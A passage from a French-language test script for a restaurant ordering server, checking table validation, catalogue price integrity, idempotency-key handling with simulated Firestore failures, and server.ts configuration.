    'Scénario 9 : src/App.tsx ne vide le panier client qu\'APRÈS confirmation serveur réussie'
  );

  // Scénario 10: Intégration du point d'entrée serveur sans catalogue de secours
  const fbTsContent = fs.readFileSync(path.resolve('src/lib/firebase.ts'), 'utf-8');
  assert(
    fbTsContent.includes("fetch('/api/orders'") &&
    !fbTsContent.includes('CHEZ_AWA_MENU_ITEMS'),
    'Scénario 10 : submitOrderWithServerValidation délègue à /api/orders sans catalogue de secours local'
  );

  // ==========================================================================
  // SECTION 7 : DURCISSEMENT FINAL — TABLES, CATALOGUE STRICT, IDEMPOTENCE & SERVEUR ADMIN
  // ==========================================================================
  console.log('\n--- SECTION 7 : DURCISSEMENT FINAL — TABLES, CATALOGUE STRICT, IDEMPOTENCE & SERVEUR ADMIN ---');

  // --- 7.1 : VALIDATION STRICTE ET OBLIGATOIRE DES TABLES (5 CAS) ---
  console.log('  [7.1] Validation des tables réelles...');

  // Cas 1 : Panne de lecture des tables
  const providerTableReadError = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { throw new Error('Délai de réponse dépassé sur la collection tables'); },
    async saveOrder() {}
  };
  const resTableReadError = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4',
    idempotencyKey: 'idem-test-table-read-err',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerTableReadError);
  assert(
    resTableReadError.success === false && resTableReadError.error.includes('Erreur serveur lors de la lecture des tables'),
    '7.1.a : Panne de lecture des tables entraîne un rejet formel sans création'
  );

  // Cas 2 : Collection de tables vide
  const providerEmptyTables = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return []; },
    async saveOrder() {}
  };
  const resEmptyTables = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4',
    idempotencyKey: 'idem-test-empty-tables',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerEmptyTables);
  assert(
    resEmptyTables.success === false && resEmptyTables.error.includes('Aucune table n\'est configurée'),
    '7.1.b : Collection de tables vide entraîne un rejet formel'
  );

  // Cas 3 : Table inexistante
  const resTableNotFound = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '99',
    idempotencyKey: 'idem-test-table-not-found',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, mockServerProvider);
  assert(
    resTableNotFound.success === false && resTableNotFound.error.includes('n\'existe pas'),
    '7.1.c : Numéro de table inexistant rejeté'
  );

  // Cas 4 : Table inactive (isActive === false)
  const resTableInactive = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '5', // Table 5 est isActive: false
    idempotencyKey: 'idem-test-table-inactive',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, mockServerProvider);
  assert(
    resTableInactive.success === false && resTableInactive.error.includes('inactive ou fermée'),
    '7.1.d : Table inactive rejetée'
  );

  // Cas 5 : Table valide (isActive === true)
  const resTableValid = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4', // Table 4 est isActive: true
    idempotencyKey: 'idem-test-table-valid',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, mockServerProvider);
  assert(
    resTableValid.success === true && resTableValid.order && resTableValid.order.tableNumber === '4',
    '7.1.e : Table valide et active acceptée avec succès'
  );

  // --- 7.2 : VALIDATION STRICTE DU CATALOGUE (DISPONIBILITÉ & INTÉGRITÉ DES PRIX) ---
  console.log('  [7.2] Validation stricte du catalogue...');

  // Rejet si available n'est pas explicitement true (ex: undefined ou false)
  const catalogWithImplicitAvailability = [
    {
      id: 'dish-no-avail',
      restaurantSlug: 'chez-awa',
      name: 'Plat Sans Disponibilité Explicite',
      category: 'plats',
      price: 5000
      // available manquant / undefined
    }
  ];
  const providerNoAvail = {
    async getMenuItems() { return catalogWithImplicitAvailability; },
    async getTables() { return mockRealTables; },
    async saveOrder() {}
  };
  const resNotExplicitlyAvailable = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-test-no-avail',
    cart: [{ menuItemId: 'dish-no-avail', quantity: 1 }]
  }, providerNoAvail);
  assert(
    resNotExplicitlyAvailable.success === false && resNotExplicitlyAvailable.error.includes('indisponible'),
    '7.2.a : Rejette formellement tout plat dont available n\'est pas explicitement true'
  );

  // Rejet si prix de base du plat est négatif ou corrompu (sans conversion silencieuse en 0)
  const catalogWithCorruptedPrice = [
    {
      id: 'dish-corrupt-price',
      restaurantSlug: 'chez-awa',
      name: 'Plat Prix Corrompu',
      category: 'plats',
      price: -2500, // Prix négatif
      available: true
    }
  ];
  const providerCorruptPrice = {
    async getMenuItems() { return catalogWithCorruptedPrice; },
    async getTables() { return mockRealTables; },
    async saveOrder() {}
  };
  const resCorruptPrice = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-test-corrupt-price',
    cart: [{ menuItemId: 'dish-corrupt-price', quantity: 1 }]
  }, providerCorruptPrice);
  assert(
    resCorruptPrice.success === false && resCorruptPrice.error.includes('Donnée de catalogue corrompue'),
    '7.2.b : Rejette un plat ayant un prix de base corrompu ou négatif sans le convertir en zéro'
  );

  // Rejet si surcoût d'option corrompu
  const catalogWithCorruptOption = [
    {
      id: 'dish-opt-corrupt',
      restaurantSlug: 'chez-awa',
      name: 'Plat Option Corrompue',
      category: 'plats',
      price: 5000,
      available: true,
      optionGroups: [{
        id: 'grp-1',
        name: 'Groupe 1',
        options: [{ id: 'opt-bad', name: 'Option Négative', extraPrice: -100 }]
      }]
    }
  ];
  const providerCorruptOpt = {
    async getMenuItems() { return catalogWithCorruptOption; },
    async getTables() { return mockRealTables; },
    async saveOrder() {}
  };
  const resCorruptOpt = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-test-corrupt-opt',
    cart: [{
      menuItemId: 'dish-opt-corrupt',
      quantity: 1,
      selectedOption: { groupId: 'grp-1', optionId: 'opt-bad' }
    }]
  }, providerCorruptOpt);
  assert(
    resCorruptOpt.success === false && resCorruptOpt.error.includes('Donnée de catalogue corrompue'),
    '7.2.c : Rejette une option avec un surcoût négatif ou invalide sans le convertir en zéro'
  );

  // Rejet si prix d'un supplément (extra) est corrompu
  const catalogWithCorruptExtra = [
    {
      id: 'dish-extra-corrupt',
      restaurantSlug: 'chez-awa',
      name: 'Plat Extra Corrompu',
      category: 'plats',
      price: 5000,
      available: true,
      availableExtras: [{ id: 'ext-bad', name: 'Extra Négatif', price: -300 }]
    }
  ];
  const providerCorruptExtra = {
    async getMenuItems() { return catalogWithCorruptExtra; },
    async getTables() { return mockRealTables; },
    async saveOrder() {}
  };
  const resCorruptExtra = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-test-corrupt-extra',
    cart: [{
      menuItemId: 'dish-extra-corrupt',
      quantity: 1,
      selectedExtras: [{ extraId: 'ext-bad' }]
    }]
  }, providerCorruptExtra);
  assert(
    resCorruptExtra.success === false && resCorruptExtra.error.includes('Donnée de catalogue corrompue'),
    '7.2.d : Rejette un extra avec un prix négatif ou invalide sans le convertir en zéro'
  );

  // --- 7.3 : DURCISSEMENT DE L'IDEMPOTENCE (RÉCONCILIATION AMBIGUË & PERSISTANCE TRANSACTIONNELLE) ---
  console.log('  [7.3] Durcissement de l\'idempotence...');

  clearServerIdempotencyStore();
  const sharedKey = 'idem-key-strict-test-1';

  // 1. Première exécution avec sharedKey
  const resIdemFirst = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: sharedKey,
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, mockServerProvider);
  assert(resIdemFirst.success === true, '7.3.a : Première soumission avec la clé acceptée');

  // 2. Réutilisation de la même clé avec un contenu différent (ex: plat différent)
  const resIdemConflict = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: sharedKey,
    cart: [{ menuItemId: 'dish-poulet', quantity: 3 }] // Quantité modifiée !
  }, mockServerProvider);
  assert(
    resIdemConflict.success === false && resIdemConflict.error.includes('Conflit d\'idempotence'),
    '7.3.b : Rejet immédiat si la clé d\'idempotence est réutilisée avec un contenu différent'
  );

  // 3. Réutilisation de la même clé avec un restaurant différent
  const resIdemRestoConflict = await processOrderSubmission({
    restaurantSlug: 'autre-restaurant',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: sharedKey,
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, mockServerProvider);
  assert(
    resIdemRestoConflict.success === false && resIdemRestoConflict.error.includes('Conflit d\'idempotence'),
    '7.3.c : Rejet immédiat si la clé d\'idempotence est réutilisée pour un autre restaurant'
  );

  // 4. Échec du registre persistant lors de la réservation : arrêt immédiat (Fail-Fast)
  const providerWithBrokenRegistry = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async saveOrder() { throw new Error('Ne doit jamais être appelé'); },
    async reserveIdempotencyKey() {
      throw new Error('Firestore transaction lock acquisition timeout (503)');
    }
  };
  const resBrokenRegistry = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-broken-registry-test',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerWithBrokenRegistry);
  assert(
    resBrokenRegistry.success === false && 
    resBrokenRegistry.error.includes('Échec du registre persistant d\'idempotence') &&
    resBrokenRegistry.error.toLowerCase().includes('interrompu'),
    '7.3.d : Arrêt immédiat (Fail-Fast) sans création si la réservation persistante échoue'
  );

  // EXIGENCE 5 : Note client différente (customerNote) avec la même clé entraîne formellement un conflit d'idempotence
  clearServerIdempotencyStore();
  const keyNoteTest = 'idem-note-conflict-key';
  const resFirstNote = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: keyNoteTest,
    customerNote: 'Bien cuit sans piment',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, mockServerProvider);
  assert(resFirstNote.success === true, '7.3.e : Première soumission avec note client acceptée');

  const resSecondNoteConflict = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: keyNoteTest,
    customerNote: 'Ajouter beaucoup de sauce piquante', // customerNote modifiée !
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, mockServerProvider);
  assert(
    resSecondNoteConflict.success === false && 
    resSecondNoteConflict.error.includes('Conflit d\'idempotence'),
    '7.3.f : Note client différente (customerNote) avec la même clé entraîne formellement un conflit d\'idempotence'
  );

  // EXIGENCE 6 : Test de concurrence atomique (Simulation 2 instances concurrentes)
  clearServerIdempotencyStore();
  const simulatedPersistentStore = new Map();
  const concurrentAtomicProvider = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async saveOrder(_slug, order) {
      // Simuler une latence d'écriture Firestore
      await new Promise(r => setTimeout(r, 20));
    },
    async reserveIdempotencyKey(key, signature) {
      const existing = simulatedPersistentStore.get(key);
      if (existing) {
        if (existing.signature !== signature) {
          return { status: 'conflict', error: 'Conflit signature' };
        }
        if (existing.status === 'completed') {
          return { status: 'completed', record: existing };
        }
        if (existing.status === 'processing') {
          return { status: 'in_progress', error: 'Une requête identique est déjà en cours de traitement par une autre instance.' };
        }
      }
      const newRec = { timestamp: Date.now(), status: 'processing', signature };
      simulatedPersistentStore.set(key, newRec);
      return { status: 'reserved', record: newRec };
    },
    async commitIdempotencyKey(key, order, signature) {
      simulatedPersistentStore.set(key, { timestamp: Date.now(), status: 'completed', order, signature });
    }
  };

  const concurrentKey = 'idem-concurrent-atomic-test';
  const concurrentPayload = {
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: concurrentKey,
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  };

  const [concurrentRun1, concurrentRun2] = await Promise.all([
    processOrderSubmission(concurrentPayload, concurrentAtomicProvider),
    processOrderSubmission(concurrentPayload, concurrentAtomicProvider)
  ]);

  const oneSucceeded = (concurrentRun1.success && !concurrentRun2.success) || (!concurrentRun1.success && concurrentRun2.success);
  const oneBlockedAsInProgress = 
    (concurrentRun1.error?.includes('en cours de traitement')) || 
    (concurrentRun2.error?.includes('en cours de traitement'));

  assert(
    oneSucceeded && oneBlockedAsInProgress,
    '7.3.g [SIMULATION ACID CONCURRENTE EN MÉMOIRE] : Réservation atomique transactionnelle en mémoire empêche deux instances d\'accepter simultanément la même commande'
  );

  // EXIGENCE 7 : Coupure réseau lors de l'écriture : commande retrouvée par la sonde ({ status: 'found' }) et réconciliée sans duplication
  clearServerIdempotencyStore();
  const ambiguousKeyReconciled = 'idem-ambiguous-timeout-key';
  let createdOrderInDb = null;

  const providerWithAmbiguousWrite = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async saveOrder(_slug, order) {
      // Simule que Firestore a écrit la commande en base, mais le socket réseau s'est coupé avant le ACK
      createdOrderInDb = order;
      throw new Error('ETIMEDOUT: Connection closed prematurely before ACK received');
    },
    async getOrderById(_slug, orderId) {
      // Sonde post-panne : Firestore retrouve bien la commande !
      if (createdOrderInDb && createdOrderInDb.id === orderId) {
        return { status: 'found', order: createdOrderInDb };
      }
      return { status: 'not_found' };
    }
  };

  const resAmbiguousWriteReconciled = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: ambiguousKeyReconciled,
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerWithAmbiguousWrite);

  assert(
    resAmbiguousWriteReconciled.success === true && 
    resAmbiguousWriteReconciled.order?.id === createdOrderInDb.id &&
    resAmbiguousWriteReconciled.idempotentReplay === true,
    '7.3.h : Commande écrite avant coupure réseau retrouvée par la sonde ({ status: \'found\' }) et réconciliée sans duplication'
  );

  // EXIGENCE 1 : Sonde Firestore en erreur jamais assimilée à une commande absente, bloque le doublon
  clearServerIdempotencyStore();
  const ambiguousKeyProbeError = 'idem-ambiguous-probe-error';
  let orderCreatedInProbeErrorTest = false;
  const providerWithProbeError = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async saveOrder() {
      orderCreatedInProbeErrorTest = true;
      throw new Error('Ne doit jamais tenter de recréer');
    },
    async reserveIdempotencyKey(key, signature) {
      return {
        status: 'ambiguous',
        record: {
          timestamp: Date.now() - 5000,
          status: 'ambiguous',
          signature,
          pendingOrderId: 'ord-previous-pending-999'
        }
      };
    },
    async getOrderById() {
      return { status: 'error', error: 'Firestore socket timeout / deadline exceeded (504)' };
    }
  };
  const resProbeError = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: ambiguousKeyProbeError,
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerWithProbeError);
  assert(
    resProbeError.success === false &&
    resProbeError.error.includes('La vérification de l\'état de la commande précédente a échoué') &&
    orderCreatedInProbeErrorTest === false,
    '7.3.i : Sonde Firestore en erreur jamais assimilée à une commande absente : interrompt formellement et bloque la création d\'un doublon'
  );

  // EXIGENCE 2 : Clé ambiguë avec sonde confirmant l'absence ne peut créer de commande sans transitionKeyToProcessing réussie
  clearServerIdempotencyStore();
  const ambiguousKeyNoTransition = 'idem-ambiguous-no-transition';
  let orderCreatedInNoTransitionTest = false;
  const providerWithFailedTransition = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async saveOrder() {
      orderCreatedInNoTransitionTest = true;
    },
    async reserveIdempotencyKey(key, signature) {
      return {
        status: 'ambiguous',
        record: {
          timestamp: Date.now() - 5000,
          status: 'ambiguous',
          signature,
          pendingOrderId: 'ord-pending-missing-1'
        }
      };
    },
    async getOrderById() {
      return { status: 'not_found' }; // Sonde confirme l'absence
    },
    async transitionKeyToProcessing() {
      // Une autre instance concurrente a déjà pris la transition atomique
      return false;
    }
  };
  const resFailedTransition = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: ambiguousKeyNoTransition,
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerWithFailedTransition);
  assert(
    resFailedTransition.success === false &&
    resFailedTransition.error.includes('Une autre instance a déjà repris le traitement') &&
    orderCreatedInNoTransitionTest === false,
    '7.3.j : Clé ambiguë avec sonde confirmant l\'absence ne peut créer de commande sans transition atomique réussie (transitionKeyToProcessing)'
  );

  // EXIGENCE 3 : Échec de commitIdempotencyKey après écriture réussie ne produit pas un faux succès, renvoie incertitude et préserve l'état
  clearServerIdempotencyStore();
  const keyCommitFailure = 'idem-commit-failure-key';
  let markedAmbiguousWithOrderId = null;
  const providerWithCommitFailure = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async saveOrder() {
      // saveOrder réussit avec succès !
    },
    async commitIdempotencyKey() {
      throw new Error('Contention sur le document idempotency_keys (conflit de verrou transactionnel)');
    },
    async markIdempotencyAmbiguous(key, orderId) {
      markedAmbiguousWithOrderId = orderId;
    }
  };
  const resCommitFailure = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: keyCommitFailure,
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerWithCommitFailure);
  assert(
    resCommitFailure.success === false &&
    resCommitFailure.error.includes('enregistrée dans Firestore mais la confirmation d\'idempotence a échoué') &&
    markedAmbiguousWithOrderId !== null,
    '7.3.k : Échec de commitIdempotencyKey après écriture réussie : ne produit pas un faux succès, renvoie incertitude et préserve l\'état ambigu'
  );

  // EXIGENCE 4 : Échec de markIdempotencyAmbiguous interrompt formellement le traitement pour prévenir tout doublon
  clearServerIdempotencyStore();
  const keyMarkAmbiguousFailure = 'idem-mark-ambiguous-failure';
  const providerWithMarkAmbiguousFailure = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async saveOrder() {
      throw new Error('Délai dépassé lors du premier saveOrder');
    },
    async getOrderById() {
      return { status: 'not_found' };
    },
    async markIdempotencyAmbiguous() {
      throw new Error('Échec d\'écriture Firestore sur la collection d\'idempotence');
    }
  };
  const resMarkFailure = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: keyMarkAmbiguousFailure,
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerWithMarkAmbiguousFailure);
  assert(
    resMarkFailure.success === false &&
    resMarkFailure.error.includes('échec de marquage ambigu du registre') &&
    resMarkFailure.error.toLowerCase().includes('interrompu'),
    '7.3.l : Échec de markIdempotencyAmbiguous interrompt formellement le traitement sans masquer l\'erreur'
  );

  // Panne d'écriture réelle où la sonde confirme l'absence : marquage ambigu et message d'incertitude
  clearServerIdempotencyStore();
  const providerWithRealFailure = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async saveOrder() {
      throw new Error('UNAVAILABLE: Datastore service error');
    },
    async getOrderById() {
      return { status: 'not_found' };
    }
  };

  const resRealFailure = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-real-failure-test',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerWithRealFailure);

  assert(
    resRealFailure.success === false && 
    resRealFailure.error.includes('Statut d\'écriture ambigu dans Firestore') &&
    !resRealFailure.error.includes('La commande n\'existe pas'),
    '7.3.m : Panne non confirmée : ne prétend pas que la commande n\'existe pas et invite à la réconciliation'
  );

  // --- 7.5 : TESTS TRANSACTION ATOMIQUE UNIFIÉE (CAS A, B, C, D, E) ---
  console.log('  [7.5] Transaction atomique unifiée (Cas A à E)...');

  // Cas A : Replay nominal (clé complétée avec commande terminée identique)
  const providerCasA = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async executeOrderTransaction({ signature }) {
      return {
        success: true,
        order: { id: 'ord_123', totalAmount: 9500, contentSignature: signature },
        idempotentReplay: true
      };
    }
  };
  const resCasA = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-cas-a-replay',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerCasA);
  assert(resCasA.success === true && resCasA.idempotentReplay === true, '7.5.a (Cas A) : Replay nominal d\'une commande déjà complétée');

  // Cas B : Auto-réparation (commande existante sans registre)
  const providerCasB = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async executeOrderTransaction({ signature }) {
      return {
        success: true,
        order: { id: 'ord_auto_repair', totalAmount: 9500, contentSignature: signature },
        idempotentReplay: true
      };
    }
  };
  const resCasB = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-cas-b-repair',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerCasB);
  assert(resCasB.success === true && resCasB.idempotentReplay === true, '7.5.b (Cas B) : Auto-réparation du registre d\'idempotence si la commande existait déjà');

  // Cas C : Incohérence registre sans commande -> Rejet
  const providerCasC = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async executeOrderTransaction() {
      return {
        success: false,
        error: "Incohérence persistante : la commande enregistrée sous cette clé est introuvable."
      };
    }
  };
  const resCasC = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-cas-c-orphan',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerCasC);
  assert(resCasC.success === false && resCasC.error.includes('Incohérence persistante'), '7.5.c (Cas C) : Rejet formel si registre présent sans document de commande');

  // Cas D : Conflit de signature -> Rejet 409
  const providerCasD = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async executeOrderTransaction() {
      return {
        success: false,
        conflict: true,
        error: "Conflit d'idempotence : La clé a déjà été utilisée pour une requête avec un contenu différent."
      };
    }
  };
  const resCasD = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-cas-d-conflict',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerCasD);
  assert(resCasD.success === false && resCasD.conflict === true, '7.5.d (Cas D) : Rejet avec flag conflict=true lors d\'une altération du contenu pour une même clé');

  // Cas E : Double-écriture nominale
  const providerCasE = {
    async getMenuItems() { return mockCatalog; },
    async getTables() { return mockRealTables; },
    async executeOrderTransaction({ orderToCreate }) {
      return {
        success: true,
        order: orderToCreate
      };
    }
  };
  const resCasE = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-cas-e-nominal',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, providerCasE);
  assert(resCasE.success === true && resCasE.order && !resCasE.idempotentReplay, '7.5.e (Cas E) : Double-écriture atomique nominale réussie (commande + registre)');

  // --- 7.4 : VÉRIFICATION DU COMPORTEMENT RÉEL DU SERVEUR (server.ts) ---
  console.log('  [7.4] Vérification de server.ts et conformité Admin SDK...');

  const serverTsContent = fs.readFileSync(path.resolve('server.ts'), 'utf-8');

  // Vérification de la suppression totale du SDK client dans server.ts
  assert(
    !serverTsContent.includes("from './src/lib/firebase.js'") && 
    !serverTsContent.includes("from 'firebase/firestore'"),
    '7.4.a : server.ts ne recourt JAMAIS au SDK Firebase client pour écrire ou lire'
  );

  // Vérification du verrou HTTP 503 si Firebase Admin SDK n'est pas initialisé
  assert(
    serverTsContent.includes('if (!adminDb)') && 
    serverTsContent.includes('res.status(503)'),
    '7.4.b : server.ts interdit formellement le traitement de commandes si Firebase Admin SDK est absent (HTTP 503)'
  );

  // Vérification de l'écriture de commande exclusive via Firebase Admin SDK
  assert(
    serverTsContent.includes('await adminDb.collection(\'restaurants\').doc(restaurantSlug).collection(\'orders\')'),
    '7.4.c : saveOrder dans server.ts utilise exclusivement Firebase Admin SDK de confiance'
  );

  // Vérification de la route diagnostic
  assert(
    serverTsContent.includes("app.get('/api/health'"),
    '7.4.d : Route /api/health présente pour diagnostiquer l\'état de Firebase Admin SDK'
  );

  // ==========================================================================
  // BILAN GÉNÉRAL LOT 2
  // ==========================================================================
  console.log('\n====================================================');
  console.log(`RÉSULTATS VALIDATION LOT 2 : ${passedTests}/${totalTests} tests réussis (${failedTests} échecs)`);
  console.log('====================================================');

  if (failedTests > 0) {
    process.exit(1);
  }
}

runTests().catch((err) => {
  console.error('Erreur inattendue durant les tests du Lot 2 :', err);
  process.exit(1);
});
